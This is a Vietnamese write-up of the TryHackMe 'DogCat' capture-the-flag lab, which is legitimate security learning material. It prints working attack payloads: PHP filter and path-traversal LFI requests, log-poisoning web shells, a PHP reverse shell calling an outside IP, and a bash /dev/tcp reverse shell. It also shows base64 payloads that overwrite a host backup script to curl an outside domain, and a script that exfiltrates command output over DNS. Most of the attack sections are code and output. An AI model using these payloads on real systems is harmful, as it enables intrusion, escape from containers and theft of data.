### Write-up lab DogCat TryHackMe
Ở lab này, ta có thể lợi dụng PHP wrapper để thực thi RCE trong một docker của một machine của TryHackMe. Lần đầu tiên làm lab này, mình đã quên mất rằng mình đang VPN đến network của TryHackMe cho nên các kĩ thuật rev-shell đã không hoạt động do mình không thực hiện bắt socket của lab trong network riêng của TryHackMe. Tuy vậy nhưng ta vẫn có thể lấy toàn bộ 4 flag của lab qua các kĩ thuật khác mà không sử dụng Attack-box của TryHackMe, khiến cho quá trình làm lab phức tạp và dư thừa hơn một chút D:

Tuy vậy, nhờ đó mà mình có thể học thêm một số kiến thức mới cũng như là có thể thực hành các kĩ thuật phức tạp hơn để có thể khai thác.

### Khai thác lỗ hổng PHP wrapper, path traversal, LFI
Challenge này nhận param `view` với hai giá trị là `dog` và `cat`. Sau khi thử nghiệm các payload, nhận thấy rằng service sẽ trả về lỗi nếu giá trị của view chứa giá trị ngẫu nhiên khác, ví dụ:
```http
GET /?view=dogdog HTTP/1.1
Host: 10.10.25.253
```
```
Warning: include(): Failed opening 'dogdog.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php
```
Như vậy, rõ ràng service đã dính lỗ hổng LFI. Query `/?view` sẽ được gọi nếu có chứa `dog` hoặc `cat`, sau đó gán `.php` để gọi file, ví dụ `dog.php`.

Mục tiêu hiện giờ là có thể đọc được file `index.php`, ta có thể thực hiện bypass như sau:
```http
/?view=php://filter/convert.base64-encode/resource=dogcat/../index
```

### Phân tích source code

Nội dung php của file `index.php`:
```php
<?php
    function containsStr($str, $substr) {
        return strpos($str, $substr) !== false;
    }
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
    if(isset($_GET['view'])) {
        if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
            echo 'Here you go!';
            include $_GET['view'] . $ext;
        } else {
            echo 'Sorry, only dogs or cats are allowed.';
        }
    }
?>
```
Như vậy, ta đã hiểu lý do vì sao service trả về lỗi. Lỗ hổng chính nằm ở dòng code:
```php
include $_GET['view'] . $ext;
```
Ở đây, service sẽ include toàn bộ file có giá trị của view + biến ext mà không hề có biện pháp validate nào khác ngoại trừ kiểm tra chuỗi đơn giản. Để có thể đọc file khác file php, ta chỉ cần làm giá trị biến `ext` là rỗng, ví dụ: 
```
/?view=dog/../../../../etc/passwd&ext=
```
Như vậy, với cách bypass trên ta có thể thực hiện đọc toàn bộ file của hệ thống.

### Beyond LFI

Khi đạt được LFI, ta có thể từ đó thực hiện các kĩ thuật như log poisoning, LFI2RCE qua upload file, Proc Environ Injection, Chaining với SSRF, sửa file để thực hiện xss 

Nguồn:

https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1/

https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2/

Như vậy, ta có thể tìm cách thực thi RCE nhờ những kĩ thuật trên.

Sau quá trình thử nghiệm, nhận thấy server dính lỗ hổng log poisoning và proc environ injection: toàn bộ log được ghi lại và có thể gọi nhờ LFI 
```
/?view=dog/../../../../proc/self/fd/7&ext=
```
```
/?view=dog/../../../..../../../var/log/apache2/access.log&ext=
```

Để kiểm chứng lỗ hổng, ta sẽ chèn code php vào request, sau đó payload này sẽ nằm trong log, gọi file log này để thực thi code. Câu lệnh được thực thi sẽ chứng tỏ khả năng RCE, ví dụ:

Request chèn payload vào log
```
GET /<?php phpinfo();?> HTTP/1.1 
Host: 10.10.51.59
```
Request đọc log
```
GET /?view=dogcat/../../../../proc/self/fd/7&ext= HTTP/1.1
Host: 10.10.51.59
```
Response trả về thành công nội dung của php info.

### Fake reverse shell

Để thực hiện rev shell, ta có thể gọi socket của php, hoặc sử dụng lệnh os, ví dụ:
```http
GET /?view=dog HTTP/1.1
Host: 10.10.114.233
User-Agent: <?php $sock=fsockopen('160.19.78.160',4444);$proc=proc_open('/bin/sh', array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>
```
Sau đó thực hiện LFI để thực thi code php:
```http
GET /?view=dogcat/../../../../proc/self/fd/7&ext= HTTP/1.1
Host: 10.10.51.59
```
Nhưng có vẻ như server không thể gọi ra ngoài nhờ socket của php:
```
fsockopen(): unable to connect to 160.19.78.160:4444 (Connection timed out) in /proc/self/fd/7
```

Nhận thấy rằng, sau khi thực hiện câu lệnh nslookup, cũng không nhận được kết quả. Như vậy có thể kết luận rằng server này không thể thực hiện kết nối ra ngoài để thực hiện rev shell.

Vậy, để đơn giản hóa quá trình, ta có thể tạo một "rev-shell" giả bằng cách thực hiện câu lệnh manually trong request, sau đó extract dữ liệu của response. Ta có thể thực hiện bằng một script python (fakeshell.py). Ta thực hiện chèn log poisoning và thực thi câu lệnh như sau:

Chèn User-Agent vào log:
```
User-Agent:<?php system($_GET['c']); ?>
```
Request thực thi câu lệnh
```
GET /?view=dogcat/../../../../proc/self/fd/7&ext=&c=id
```
Response trả về chứa kết quả của câu lệnh, ví dụ:
```
10.17.58.237 - - [14/May/2025:08:32:52 +0000] "GET /?view=dog HTTP/1.1" 200 564 "http://10.10.149.37/" "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
```

### Linux Privilege Escalation

1. Enumerate
```
rce> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

rce> hostname
d2d52195b451

rce> uname -a
Linux d2d52195b451 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux

rce> cat /proc/version
Linux version 4.15.0-96-generic (buildd@lgw01-amd64-004) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020
```
Ta có thể thấy đang thực thi câu lệnh dưới user www-data, dựa vào hostname có vẻ là một container Docker, sử dụng Ubuntu 18.04 (x86_64) và chạy trên nhân Linux 4.15.0-96-generic. Từ `ps` cũng có thể thấy apache đang phục vụ web.

2. Privilege Escalation: www-data -> root

Output từ `sudo -l`
```
User www-data may run the following commands on d2d52195b451:
    (root) NOPASSWD: /usr/bin/env
```

Công cụ không thể thiếu trong khi làm những lab priv escalation: https://gtfobins.github.io/.

Ta có thể đơn giản thực hiện câu lệnh sau trong gtfobins để chiếm quyền root
```
rce> sudo /usr/bin/env sh -c 'id'
uid=0(root) gid=0(root) groups=0(root)
```

Để tự động quá trình, script python trên sửa thành:
```py
params = {
    "view": "dogcat/../../../../proc/self/fd/7",
    "ext": "",
    "c": f"sudo /usr/bin/env sh -c '{cmd}'"
}
```
Xác nhận lại fake shell:
```bash
python3 fakeshell.py
rce> id
uid=0(root) gid=0(root) groups=0(root)
```

### Tìm flag

Thực hiện tìm kiếm vị trí của flag
```
rce> find / -type f -iname "*flag*" 2>/dev/null
.
.
.
/var/www/html/flag.php
/var/www/flag2_QMW7JvaY2LvK.txt
.
.
.
/root/flag3.txt
.
.
.
```
1. Flag đầu tiên nằm ở vị trí cùng index.php
```
rce> ls; cat flag.php | base64
cat.php
cats
dog.php
dogs
flag.php
index.php
style.css
PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=
```
```
THM{Th1s_1s_N0t_4_Catdog_*******}
```

2. Flag thứ hai nằm ở thư mục `var/www/`
```
rce> cd ../;ls;cat flag2_QMW7JvaY2LvK.txt
flag2_QMW7JvaY2LvK.txt
html
THM{LF1_t0_RC3_******}
```

3. Flag thứ 3 nằm trong thư mục root
```
rce> cd ../../../root;ls;cat flag3.txt
flag3.txt
THM{D1ff3r3nt_3nv1ronments_******}
```                                                                                                                                                        
### Think out side of the box

Với kinh nghiệm làm các lab leo thang ít ỏi của mình, thường thường các file `.sh` nên có sự chú ý quan trọng hơn. Ta có thể thực hiện lệnh tìm kiếm tất cả các file `.sh` trong hệ thống và xem xét những file lạ, ví dụ câu lệnh:

```
rce> find / -type f -name '*.sh'   
/opt/backups/backup.sh
/etc/init.d/hwclock.sh
/lib/init/vars.sh
/usr/local/lib/php/build/ltmain.sh
/usr/share/debconf/confmodule.sh
```
Ta phát hiện thư mục `backups` tại `/opt` gồm `backup.sh` và `backup.tar`
```bash
rce> cd ../../../opt/backups; ls
backup.sh
backup.tar
```

Có vẻ như thư mục này sẽ được thực thi bởi host chứ không phải container docker hiện tại để backup toàn bộ server. Như vậy, bằng việc sửa `backup.sh`, ta có thể thực thi RCE trên host.

Tuy vậy, qua nhiều lần thử nghiệm, ta chỉ có thể thực hiện kiểm tra điều này thông qua kĩ thuật OOB bằng DNS. Có vẻ như host đã chặn HTTP/HTTPS và TCP, khá khó hiểu.

Ví dụ, để có thể khiến host thực thi query DNS, ta sẽ dùng 
```
cd /opt/backups;echo "IyEvYmluL2Jhc2gKY3VybCBodHRwOi8vdXc3Z2JsaWcucmVxdWVzdHJlcG8uY29t" | base64 -d > backup.sh;
```
Phần base64 encoding có nội dung là 
```
#!/bin/bash
curl http://uw7gblig.requestrepo.com
```
Như vậy, ta đã có thể khiến host thực thi câu lệnh curl vì host sẽ thực thi backup.sh (có thể qua một cronjob, hoặc bash tự động). Sau một thời gian ngắn, ta có thể nhận được các gói tin DNS của host, xác nhận khả năng exfiltration thông qua phương pháp này.

Để có thể đọc được output của câu lệnh, ta có thể encode kết quả của câu lệnh dưới dạng base32, sau đó chia nhỏ từng phần để có thể đủ chứa trong domain name. Sau đó thực hiện gọi từng domain này:
```bash
#!/bin/bash
CMD="id;ls"
DOMAIN="uw7gblig.requestrepo.com"
payload=$( bash -c "$CMD" | base32 | tr -d '=\n' )
chunk_size=32
len=${#payload}
for (( offset=0; offset < len; offset += chunk_size )); do
  chunk=${payload:offset:chunk_size}
  idx=$(( offset / chunk_size ))
  fqdn="${chunk}.${idx}.${DOMAIN}"
  nslookup "$fqdn"
  sleep 0.2
done
```
Kết quả trả về cho ta thấy đã thành công RCE trên host với user root. Đồng thời trong thư mục hiện tại chứa flag cuối cùng. Thay thế câu lệnh trong bash script trên thành `cat flag4.txt`, ta nhận được các gói DNS sau:
```
KREE263FONRTI3BUORUW63TTL5XW4X3F.0.uw7gblig.requestrepo.com
ONRTI3BUORUW63TTL5XW4X3FONRTI3BU.1.uw7gblig.requestrepo.com
ORUW63TTL43WCNJSMIYTOZDCME3GKYTC.2.uw7gblig.requestrepo.com
GBSGGMZYMJRTCMBUHFRGGYTBGA******.3.uw7gblig.requestrepo.com
```

Nội dung base32 của domain chính là flag cuối cùng
```
echo "KREE263FONRTI3BUORUW63TTL5XW4X3FONRTI3BUORUW63TTL5XW4X3FONRTI3BUORUW63TTL43WCNJSMIYTOZDCME3GKYTCGBSGGMZYMJRTCMBUHFRGGYTBGA******" | base32 -d
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_******************************}
```

### Post exploitation

Sau khi hoàn thành lab và đọc write-ups, mình mới nhớ ra mình đang dùng VPN để làm lab, lý do mình không thể rev-shell là vì mình không dùng attack-box của Tryhackme hoặc là dùng IP tun0 của máy để bắt kết nối rev-shell mà lại dùng 1 con VPS, mà docker của lab này lại không thể kết nối ra ngoài.
    
Tuy vậy, sau khi hoàn thành tất cả flag, ta vẫn ở lại phân tích network của lab này xem sao.

Đầu tiên, xét trường hợp thực thi RCE trong docker container của lab: ta không thể thực hiện kết nối ra ngoài, có lẽ bởi vì docker được cấu hình chặt chẽ. Sau một hồi mày mò thì ta chỉ có thể luẩn quẩn kết nối đến các mạng Docker mà thôi, nội dung của `proc/net/route` như sau:
```
Iface   Destination Gateway    Flags  Mask
eth0    00000000     010011AC   0003   00000000
eth0    000011AC     00000000   0001   0000FFFF
```
Dòng đầu tiên (default route) có ý nghĩa rằng, mọi packet mà docker muốn gửi qua các địa chỉ không nằm trong 172.17.0.0/16 sẽ được đẩy qua gateway 172.17.0.1, tức là Docker bridge (docker0) trên host. Dòng thứ hai sẽ nhận diện các mạng 172.17.0.0/16 (các container với nhau) là mạng nội bộ, các mạng này sẽ không cần gateway nữa.

Điều này nghĩa là, Docker bridge đưa mọi traffic không phải local về host, nhưng host lab chỉ cho phép SNAT/NAT các địa chỉ thuộc mạng lab (10.x.x.x). Mọi thứ khác đều không được forward, đó là lý do không thể resolve hay curl ra ngoài từ trong container, chỉ có thể kết nối đến attack box của Tryhackme hoặc IP của tun0 do VPN cung cấp.

Nhận ra được điều này rồi thì ta có thể thực hiện một rev-shell bằng cách upload một `shell.php` vào thư mục hiện tại nơi chứa index.php sau đó thực thi `shell.php` trực tiếp. Nội dung `shell.php` tùy thuộc vào chúng ta lựa chọn, ở đây ta sẽ chọn script PHP của pentestmonkey. Để upload file, ta có thể thực hiện như sau:

```bash
echo 'PD9waHAKLy8gcGhwLXJldmVyc...<nội dung base64 của shell.php>...' | base64 -d > shell.php
```
Ta sẽ chọn IP của interface tun0 do VPN cung cấp hoặc IP nội bộ của attack box. Port tùy chọn, ở đây ta chọn 2727. Sau đấy thực hiện nghe kết nối đến port này trên machine của mình `nc -lvnp 2727`.

Tiếp đến phần host của lab, trước đấy mình đã có thể RCE bằng cách thay đổi file .sh trong docker, và host khi thực thi file này ta sẽ có thể RCE trên host. Tuy vậy, ta vẫn chỉ có thể thực hiện các request DNS ra ngoài internet, khá khó hiểu.

Để đạt được rev-shell trên host, ta có thể bắt host thực thi câu lệnh bash cơ bản `/bin/bash -i >& /dev/tcp/10.17.58.237/2727 0>&1`. Cách chèn vào `backup.sh` như sau:
```bash
rce> cd /opt/backups; echo 'IyEvYmluL2Jhc2gKdGFyIGNmIC9yb290L2NvbnRhaW5lci9iYWNrdXAvYmFja3VwLnRhciAvcm9vdC9jb250YWluZXIKY3VybCBodHRwOi8vZmR6N2s0MXUucmVxdWVzdHJlcG8uY29t' | base64 -d > backup.sh
```
Hãy cùng phân tích network của host:
```
ip route
default via 10.10.0.1 dev ens5 proto dhcp src 10.10.226.94 metric 100 
10.10.0.0/16 dev ens5 proto kernel scope link src 10.10.226.94 
10.10.0.1 dev ens5 proto dhcp scope link src 10.10.226.94 metric 100 
172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1
```
Kiểm chứng lại việc host chỉ có thể gửi DNS ra ngoài mà không thể gửi các gói HTTP bằng tcpdump:
```bash
sudo tcpdump -vv -n -i ens5 'tcp port 80'
tcpdump: listening on ens5, link-type EN10MB (Ethernet), capture size 262144 bytes
16:34:16.242591 IP (tos 0x0, ttl 64, id 26872, offset 0, flags [DF], proto TCP (6), length 60)
    10.10.226.94.38020 > 130.61.138.67.80: Flags [S], cksum 0xf917 (incorrect -> 0xceef), seq 725419897, win 62727, options [mss 8961,sackOK,TS val 165387373 ecr 0,nop,wscale 6], length 0
.
.
.
    <7 gói TCP SYN tương tự>
.
.
.

7 packets captured
7 packets received by filter
0 packets dropped by kernel
```
Qua kết quả của tcpdump giao thức TCP tại port 80 khi ta dùng lệnh `curl` ra ngoài internet, nhận thấy rằng hệ thống đã gửi TCP SYN packet để thực hiện truy vấn đến web ngoài internet, tuy nhiên do không nhận được gói SYN-ACK trở về nên hệ thống tiếp tục gửi lại gói SYN 6 lần nữa nhưng không nhận được thêm gói tin nào. Điều này chứng tỏ packet SYN đã rời host qua ens5 nhưng không có trả lời quay về.

Ta có thể thực hiện thử tcpdump với các packet DNS
```bash
sudo tcpdump -vv -n -i ens5 'udp port 53'
tcpdump: listening on ens5, link-type EN10MB (Ethernet), capture size 262144 bytes
16:44:05.201378 IP (tos 0x0, ttl 64, id 55743, offset 0, flags [DF], proto UDP (17), length 81)
    10.10.226.94.50187 > 10.0.0.2.53: [bad udp cksum 0xf6b8 -> 0xd934!] 37217+ [1au] A? fdz7k41u.requestrepo.com. ar: . OPT UDPsize=512 (53)
16:44:05.201481 IP (tos 0x0, ttl 64, id 55744, offset 0, flags [DF], proto UDP (17), length 81)
    10.10.226.94.44086 > 10.0.0.2.53: [bad udp cksum 0xf6b8 -> 0xee96!] 37817+ [1au] AAAA? fdz7k41u.requestrepo.com. ar: . OPT UDPsize=512 (53)
16:44:05.243446 IP (tos 0x0, ttl 255, id 0, offset 0, flags [DF], proto UDP (17), length 97)
    10.0.0.2.53 > 10.10.226.94.50187: [udp sum ok] 37217 q: A? fdz7k41u.requestrepo.com. 1/0/1 fdz7k41u.requestrepo.com. A 130.61.138.67 ar: . OPT UDPsize=4096 (69)
16:44:05.247787 IP (tos 0x0, ttl 255, id 0, offset 0, flags [DF], proto UDP (17), length 81)
    10.0.0.2.53 > 10.10.226.94.44086: [udp sum ok] 37817 q: AAAA? fdz7k41u.requestrepo.com. 0/0/1 ar: . OPT UDPsize=4096 (53)

4 packets captured
12 packets received by filter
0 packets dropped by kernel
```
Ta có thể thấy rõ 2 query A và AAAA lên DNS server nội bộ (10.0.0.2.53) đều nhận được 2 phản hồi, tổng là 4 packets được bắt. Như vậy, quá trình query DNS diễn ra bình thường.

Như vậy, TryHackMe đặt firewall ở VPC sao cho chỉ SNAT và forward các gói DNS, còn mọi TCP ra Internet đều bị drop từ ngay tại network edge, nên không thể hoàn thành kết nối HTTP ra ngoài. Điều đó giải thích lý do vì sao, lúc đầu tiên mình làm bài này khi curl thử ra ngoài chỉ thấy DNS chứ không thấy HTTP, rồi thực hiện trích xuất dữ liệu từ DNS khá cồng kềnh.
